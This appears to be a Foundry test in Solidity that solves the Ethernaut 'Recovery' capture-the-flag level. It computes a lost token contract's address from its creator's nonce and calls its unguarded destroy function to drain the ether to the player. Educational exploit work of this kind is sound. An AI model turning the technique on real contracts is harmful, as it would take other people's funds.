// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import "../src/Ethernaut.sol";
import "../src/metrics/Statistics.sol";
import "../src/levels/RecoveryFactory.sol";
import "../src/levels/Recovery.sol";

interface ISimpleToken {
    function destroy(address payable _to) external;
}

contract RecoveryTest is Test {
    using stdStorage for StdStorage;

    Ethernaut ethernaut;
    Statistics statistics;
    address eoa = address(0x1337);

    function setUp() public {
        ethernaut = new Ethernaut();

        // Statistics is actually deployed as upgradeable proxy
        // Deploying and initializing it normally for simplicity
        statistics = new Statistics();
        statistics.initialize(address(ethernaut));

        // Set Statistics contract on Ethernaut
        ethernaut.setStatistics(address(statistics));
    }

    function testRecoveryHack() public {
        /* Level Setup */
        // Deploy level factory: RecoveryFactory
        RecoveryFactory recoveryFactory = new RecoveryFactory();
        // Register level on Ethernaut
        ethernaut.registerLevel(recoveryFactory);

        // Set caller to custom address
        vm.startPrank(eoa);
        vm.deal(eoa, 1 ether);

        // Start recording logs to capture new level instance address
        vm.recordLogs();
        // Create new level instance via Ethernaut
        ethernaut.createLevelInstance{value: 0.001 ether}(recoveryFactory);

        // Parse emitted logs
        Vm.Log[] memory entries = vm.getRecordedLogs();
        assertEq(
            entries[0].topics[0],
            keccak256("LevelInstanceCreatedLog(address,address,address)")
            // event LevelInstanceCreatedLog(address indexed player, address indexed instance, address indexed level);
        );
        Vm.Log memory levelRecoveryCreatedLog = entries[0];

        // Cast bytes32 log arg into address
        address instanceAddress = address(
            uint160(uint256(levelRecoveryCreatedLog.topics[2]))
        );
        emit log_named_address("instanceAddress", instanceAddress);

        // Instantiate level instance
        Recovery instance = Recovery(payable(instanceAddress));

        /* Level Hack */
        // Address of the newly created token contract by the Recovery contract can be calculated with nonce 1
        address tokenAddress = computeCreateAddress(address(instance), 1);
        emit log_named_address("tokenAddress", tokenAddress);

        uint256 balance = address(tokenAddress).balance;
        emit log_named_uint("balance", balance);

        ISimpleToken(tokenAddress).destroy(payable(eoa));

        balance = address(tokenAddress).balance;
        emit log_named_uint("balance", balance);

        /* Level Submit */
        // Start recording logs to capture level completed log
        vm.recordLogs();
        ethernaut.submitLevelInstance(payable(instanceAddress));

        // Parse emitted logs
        Vm.Log[] memory submitLogsEntries = vm.getRecordedLogs();
        assertEq(
            submitLogsEntries[1].topics[0],
            keccak256("LevelCompletedLog(address,address,address)")
            // event LevelCompletedLog(address indexed player, address indexed instance, address indexed level);
        );
        Vm.Log memory levelCompletedLog = submitLogsEntries[1];

        // Cast bytes32 log arg into address
        address playerAddress_ = address(
            uint160(uint256(levelCompletedLog.topics[1]))
        );
        emit log_named_address("playerAddress_", playerAddress_);

        address instanceAddress_ = address(
            uint160(uint256(levelCompletedLog.topics[2]))
        );
        emit log_named_address("instanceAddress_", instanceAddress_);

        assertEq(playerAddress_, eoa);
        assertEq(instanceAddress_, instanceAddress);

        vm.stopPrank();
    }
}
